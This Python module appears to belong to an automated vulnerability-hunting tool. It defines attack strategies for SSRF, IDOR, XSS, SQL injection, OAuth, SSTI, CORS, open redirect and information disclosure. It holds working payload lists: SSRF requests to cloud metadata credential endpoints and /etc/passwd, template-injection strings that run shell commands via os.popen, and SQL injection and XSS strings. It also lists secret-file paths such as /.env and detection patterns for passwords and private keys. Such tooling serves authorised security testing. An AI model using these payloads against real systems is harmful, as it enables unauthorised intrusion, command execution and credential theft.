"""
╔══════════════════════════════════════════════════════════════╗
║  Hunt Strategies — Vuln-Class-Specific Attack Playbooks     ║
║  Each strategy defines tools, payloads, detection logic     ║
╚══════════════════════════════════════════════════════════════╝
"""

import logging
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("hydra.hunt.strategies")


@dataclass
class HuntStrategy:
    """A reusable vuln-class-specific hunting strategy."""
    name: str
    vuln_class: str
    description: str
    tools: List[str]
    nuclei_tags: List[str]
    payloads: List[str] = field(default_factory=list)
    parameter_targets: List[str] = field(default_factory=list)
    paths_to_check: List[str] = field(default_factory=list)
    techniques: List[str] = field(default_factory=list)
    detection_patterns: List[str] = field(default_factory=list)
    severity_range: str = "medium,high,critical"
    priority: int = 1
    max_requests: int = 500
    timeout_per_target: int = 60

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name, "vuln_class": self.vuln_class,
            "tools": self.tools, "nuclei_tags": self.nuclei_tags,
            "priority": self.priority,
        }


# ═══════════════════════════════════════════
#  Strategy Registry
# ═══════════════════════════════════════════

SSRF_STRATEGY = HuntStrategy(
    name="SSRF Hunter",
    vuln_class="ssrf",
    description="Server-Side Request Forgery — pivot to internal resources",
    tools=["nuclei", "ffuf", "httpx"],
    nuclei_tags=["ssrf", "oast"],
    payloads=[
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80", "http://127.0.0.1:443",
        "http://127.0.0.1:8080", "http://127.0.0.1:8443",
        "http://[::1]:80", "http://0x7f000001",
        "http://0177.0.0.1", "http://2130706433",
        "file:///etc/passwd",
        "gopher://127.0.0.1:25/xHELO",
    ],
    parameter_targets=[
        "url", "uri", "path", "dest", "redirect", "callback",
        "next", "data", "reference", "site", "html", "val",
        "link", "src", "img", "feed", "to", "out", "view",
        "page", "open", "domain", "return", "port", "file",
    ],
    detection_patterns=[
        "root:x:", "ami-id", "instance-id", "computeMetadata",
        "AccessDenied", "NoSuchBucket", "Connection refused",
    ],
    priority=0,
    max_requests=300,
)

IDOR_STRATEGY = HuntStrategy(
    name="IDOR Hunter",
    vuln_class="idor",
    description="Insecure Direct Object Reference — access unauthorized resources",
    tools=["nuclei", "httpx"],
    nuclei_tags=["idor", "access-control"],
    techniques=[
        "sequential_id_increment",   # /user/1 → /user/2
        "uuid_prediction",           # predictable UUIDs
        "parameter_swap",            # userA token + userB id
        "http_method_change",        # GET→PUT/PATCH/DELETE
        "path_traversal",            # /api/user/../../admin
        "graphql_batching",          # batch multiple IDs
    ],
    parameter_targets=[
        "id", "uid", "user_id", "account_id", "profile_id",
        "order_id", "doc_id", "file_id", "invoice_id", "report_id",
        "msg_id", "thread_id", "comment_id", "post_id",
    ],
    detection_patterns=[
        "unauthorized", "forbidden", "different user data",
        "email", "phone", "address",
    ],
    priority=0,
)

XSS_STRATEGY = HuntStrategy(
    name="XSS Hunter",
    vuln_class="xss",
    description="Cross-Site Scripting — inject client-side scripts",
    tools=["nuclei", "katana", "dalfox"],
    nuclei_tags=["xss"],
    payloads=[
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "javascript:alert(1)",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "<details open ontoggle=alert(1)>",
        '"><iframe srcdoc="<script>alert(1)</script>">',
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))//",
    ],
    parameter_targets=[
        "q", "search", "query", "s", "keyword", "term",
        "name", "title", "content", "body", "message",
        "comment", "text", "value", "input", "desc",
        "redirect", "url", "next", "callback", "return",
    ],
    detection_patterns=["<script", "onerror", "alert(", "javascript:"],
    priority=1,
)

SQLI_STRATEGY = HuntStrategy(
    name="SQLi Hunter",
    vuln_class="sqli",
    description="SQL Injection — extract or manipulate database",
    tools=["nuclei", "sqlmap"],
    nuclei_tags=["sqli", "sql-injection"],
    payloads=[
        "'", "\"", "' OR '1'='1", "' OR 1=1--",
        "1 UNION SELECT NULL--", "1' AND '1'='1",
        "' WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5);--",
        "') OR ('1'='1",
        "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    ],
    parameter_targets=[
        "id", "uid", "user", "name", "page", "search",
        "query", "cat", "dir", "action", "board", "date",
        "detail", "file", "download", "path", "folder",
        "prefix", "include", "inc", "locate", "show",
        "doc", "site", "type", "view", "content", "sort",
        "order", "field", "table", "from", "sel", "where",
    ],
    detection_patterns=[
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLITE_ERROR", "unterminated", "syntax error",
        "ODBC", "unclosed quotation",
    ],
    priority=1,
)

OAUTH_STRATEGY = HuntStrategy(
    name="OAuth/Auth Flow Hunter",
    vuln_class="oauth",
    description="OAuth misconfiguration and authentication bypass",
    tools=["nuclei", "httpx"],
    nuclei_tags=["oauth", "token", "jwt", "auth"],
    techniques=[
        "token_in_referer",          # leak via Referer header
        "state_param_missing",       # CSRF via OAuth
        "redirect_uri_bypass",       # open redirect in OAuth
        "scope_escalation",          # request higher scopes
        "pkce_absence",              # missing PKCE in public clients
        "implicit_flow_abuse",       # token in URL fragment
        "jwt_none_algo",             # alg=none bypass
        "jwt_key_confusion",         # RS256 → HS256 confusion
        "token_reuse",               # replay access tokens
        "refresh_token_rotation",    # missing rotation
    ],
    parameter_targets=[
        "redirect_uri", "client_id", "response_type", "scope",
        "state", "code", "token", "id_token", "nonce",
    ],
    detection_patterns=[
        "invalid_grant", "access_denied", "unauthorized_client",
        "invalid_scope", "token", "bearer",
    ],
    priority=0,
)

AUTHZ_STRATEGY = HuntStrategy(
    name="Authorization Bypass Hunter",
    vuln_class="authz",
    description="Broken access control — horizontal and vertical escalation",
    tools=["nuclei", "httpx"],
    nuclei_tags=["auth-bypass", "default-login", "misconfig"],
    techniques=[
        "path_manipulation",         # /admin → /Admin → /%61dmin
        "method_override",           # X-HTTP-Method-Override: PUT
        "header_injection",          # X-Original-URL, X-Forwarded-For
        "role_param_tampering",      # role=user → role=admin
        "missing_function_check",    # direct access to admin functions
        "forced_browsing",           # guess admin panel paths
        "verb_tampering",            # GET→POST→PUT→DELETE
        "api_version_rollback",      # /v2/ → /v1/ (less restrictions)
    ],
    paths_to_check=[
        "/admin", "/admin/", "/administrator", "/management",
        "/api/admin", "/internal", "/debug", "/console",
        "/portal", "/dashboard", "/manager", "/control",
        "/system", "/config", "/settings", "/users",
    ],
    priority=0,
)

SSTI_STRATEGY = HuntStrategy(
    name="SSTI Hunter",
    vuln_class="ssti",
    description="Server-Side Template Injection — potential RCE via templates",
    tools=["nuclei"],
    nuclei_tags=["ssti"],
    payloads=[
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{7*7}", "{{config}}", "{{self}}", "${class.forName('java.lang.Runtime')}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "a]}}{{7*7}}", "{{dump(app)}}",
    ],
    parameter_targets=[
        "template", "page", "name", "title", "content",
        "message", "greeting", "email", "subject", "desc",
    ],
    detection_patterns=["49", "7777777", "config", "subclasses"],
    priority=1,
)

CORS_STRATEGY = HuntStrategy(
    name="CORS Misconfiguration Hunter",
    vuln_class="cors",
    description="Cross-Origin Resource Sharing misconfiguration",
    tools=["nuclei", "httpx"],
    nuclei_tags=["cors", "misconfiguration"],
    techniques=[
        "null_origin",               # Origin: null
        "wildcard_origin",           # Access-Control-Allow-Origin: *
        "subdomain_reflection",      # evil.target.com reflected
        "prefix_match",              # target.com.evil.com accepted
        "postfix_match",             # eviltarget.com accepted
        "credential_leakage",        # with credentials allowed
    ],
    detection_patterns=[
        "Access-Control-Allow-Origin",
        "Access-Control-Allow-Credentials: true",
    ],
    priority=2,
)

OPEN_REDIRECT_STRATEGY = HuntStrategy(
    name="Open Redirect Hunter",
    vuln_class="open_redirect",
    description="Unvalidated redirects for phishing or OAuth bypass",
    tools=["nuclei"],
    nuclei_tags=["redirect"],
    payloads=[
        "//evil.com", "https://evil.com", "/\\evil.com",
        "//evil%00.com", "https:evil.com", "////evil.com",
        "/\t/evil.com", "/.evil.com", "///\\;@evil.com",
        "https://evil.com%23.target.com",
        "https://evil.com%2523.target.com",
        "javascript:alert(document.domain)//",
        "data:text/html,<script>alert(1)</script>",
    ],
    parameter_targets=[
        "url", "redirect", "next", "dest", "redir", "return",
        "returnTo", "go", "checkout_url", "continue", "return_path",
        "forward", "ref", "target", "out", "view", "login",
        "logout", "image_url", "callback",
    ],
    detection_patterns=["evil.com", "Location:", "301", "302"],
    priority=2,
)

RACE_CONDITION_STRATEGY = HuntStrategy(
    name="Race Condition Hunter",
    vuln_class="race_condition",
    description="Time-of-check to time-of-use and concurrency bugs",
    tools=["nuclei", "httpx"],
    nuclei_tags=["race-condition"],
    techniques=[
        "parallel_discount_redeem",  # redeem coupon N times
        "parallel_transfer",         # double-spend money
        "parallel_vote",             # vote multiple times
        "parallel_follow",           # follow/like multiple times
        "parallel_signup",           # bypass invite limits
        "parallel_file_upload",      # race on file processing
    ],
    priority=1,
)

INFO_DISCLOSURE_STRATEGY = HuntStrategy(
    name="Information Disclosure Hunter",
    vuln_class="info_disclosure",
    description="Exposed sensitive data, debug endpoints, config files",
    tools=["nuclei", "ffuf", "dirsearch"],
    nuclei_tags=["exposure", "disclosure", "config", "backup"],
    paths_to_check=[
        "/.env", "/.git/config", "/.git/HEAD",
        "/.svn/entries", "/.DS_Store", "/.htaccess",
        "/debug", "/debug/vars", "/debug/pprof",
        "/actuator", "/actuator/env", "/actuator/health",
        "/graphql", "/graphiql", "/__graphql",
        "/server-status", "/server-info", "/phpinfo.php",
        "/elmah.axd", "/trace.axd",
        "/wp-json/wp/v2/users", "/wp-config.php.bak",
        "/api/swagger.json", "/api/swagger.yaml", "/openapi.json",
        "/swagger-ui/", "/redoc",
        "/backup.sql", "/database.sql", "/dump.sql",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/.well-known/security.txt", "/.well-known/openid-configuration",
        "/package.json", "/composer.json", "/Gemfile",
        "/web.config", "/config.yml", "/config.json",
        "/error.log", "/access.log", "/debug.log",
        "/console", "/admin/logs", "/api/logs",
    ],
    detection_patterns=[
        "DB_PASSWORD", "SECRET_KEY", "API_KEY",
        "BEGIN RSA PRIVATE", "password", "credentials",
        "phpinfo()", "DOCUMENT_ROOT", "SERVER_ADDR",
    ],
    priority=1,
)

BUSINESS_LOGIC_STRATEGY = HuntStrategy(
    name="Business Logic Hunter",
    vuln_class="business_logic",
    description="Application logic flaws not detectable by scanners",
    tools=["httpx"],
    nuclei_tags=[],
    techniques=[
        "negative_quantity",         # order -1 items
        "price_manipulation",        # change price in request
        "currency_rounding",         # rounding errors
        "workflow_skip",             # skip verification step
        "feature_abuse",             # abuse intended features
        "rate_limit_bypass",         # circumvent rate limits
        "time_manipulation",         # expire/future timestamps
        "privilege_chain",           # chain low-priv actions
    ],
    priority=2,
)


# ═══════════════════════════════════════════
#  Strategy Registry
# ═══════════════════════════════════════════

STRATEGY_REGISTRY: Dict[str, HuntStrategy] = {
    "ssrf": SSRF_STRATEGY,
    "idor": IDOR_STRATEGY,
    "xss": XSS_STRATEGY,
    "sqli": SQLI_STRATEGY,
    "oauth": OAUTH_STRATEGY,
    "authz": AUTHZ_STRATEGY,
    "ssti": SSTI_STRATEGY,
    "cors": CORS_STRATEGY,
    "open_redirect": OPEN_REDIRECT_STRATEGY,
    "race_condition": RACE_CONDITION_STRATEGY,
    "info_disclosure": INFO_DISCLOSURE_STRATEGY,
    "business_logic": BUSINESS_LOGIC_STRATEGY,
}


def get_strategy(vuln_class: str) -> Optional[HuntStrategy]:
    """Get a hunt strategy by vulnerability class."""
    return STRATEGY_REGISTRY.get(vuln_class.lower())


def list_strategies() -> List[Dict[str, Any]]:
    """List all available hunt strategies."""
    return [s.to_dict() for s in STRATEGY_REGISTRY.values()]


def get_priority_ordered() -> List[HuntStrategy]:
    """Get strategies ordered by priority (0=highest)."""
    return sorted(STRATEGY_REGISTRY.values(), key=lambda s: s.priority)
